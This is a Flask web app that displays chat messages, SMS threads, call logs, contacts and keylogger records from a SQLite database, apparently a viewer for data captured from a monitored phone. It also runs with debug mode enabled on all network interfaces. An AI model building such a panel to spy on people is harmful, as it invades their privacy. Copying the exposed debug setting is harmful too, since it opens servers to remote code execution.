from flask import Flask, render_template, send_from_directory, request, jsonify
import sqlite3
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

# Database configuration
DATABASE = 'data.db'

def get_db():
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        return conn
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return None

# Main menu route
@app.route('/')
def index():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        contacts = conn.execute('''
            SELECT DISTINCT name FROM (
                SELECT sender AS name FROM ChatMessages 
                UNION 
                SELECT from_to AS name FROM SMS
            ) ORDER BY name
        ''').fetchall()
        conn.close()
        return render_template('main_menu.html', contacts=contacts)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching contacts", 500

# Chat route
@app.route('/chat/<name>')
def chat(name):
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        messages = conn.execute(
            'SELECT * FROM ChatMessages WHERE sender = ? ORDER BY time DESC LIMIT 50',
            (name,)
        ).fetchall()
        conn.close()
        return render_template('chat.html', name=name, messages=messages)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching messages", 500

# SMS route
@app.route('/sms/<name>')
def sms_thread(name):
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        messages = conn.execute(
            'SELECT * FROM SMS WHERE from_to = ? ORDER BY time DESC LIMIT 50',
            (name,)
        ).fetchall()
        conn.close()
        return render_template('sms.html', name=name, sms_messages=messages)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching messages", 500

# Calls route
@app.route('/calls')
def calls():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        call_logs = conn.execute('SELECT * FROM Calls ORDER BY time DESC LIMIT 50').fetchall()
        conn.close()
        return render_template('calls.html', call_logs=call_logs)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching call logs", 500

# Keylogs route
@app.route('/keylogs')
def keylogs():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        keylog_data = conn.execute('SELECT * FROM Keylogs ORDER BY time DESC LIMIT 50').fetchall()
        conn.close()
        return render_template('keylogs.html', keylogs=keylog_data)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching keylogs", 500

# Contacts route
@app.route('/contacts')
def contacts_list():
    conn = get_db()
    if not conn:
        return "Database connection error", 500
    
    try:
        contact_data = conn.execute('SELECT * FROM Contacts ORDER BY name').fetchall()
        conn.close()
        return render_template('contacts.html', contacts=contact_data)
    except sqlite3.Error as e:
        logger.error(f"Database error: {e}")
        return "Error fetching contacts", 500

# Search functionality
@app.route('/search', methods=['POST'])
def search():
    search_term = request.form.get('search_term')
    if not search_term:
        return jsonify({'error': 'Search term required'}), 400

    conn = get_db()
    if not conn:
        return jsonify({'error': 'Database connection error'}), 500

    try:
        chat_results = conn.execute('''
            SELECT 'chat' as type, sender as name, text, time 
            FROM ChatMessages 
            WHERE text LIKE ? 
            ORDER BY time DESC LIMIT 25
        ''', ('%' + search_term + '%',)).fetchall()

        sms_results = conn.execute('''
            SELECT 'sms' as type, from_to as name, text, time 
            FROM SMS 
            WHERE text LIKE ? 
            ORDER BY time DESC LIMIT 25
        ''', ('%' + search_term + '%',)).fetchall()

        results = [dict(row) for row in (chat_results + sms_results)]
        conn.close()
        return jsonify(results)
    except sqlite3.Error as e:
        logger.error(f"Search error: {e}")
        return jsonify({'error': 'Search failed'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
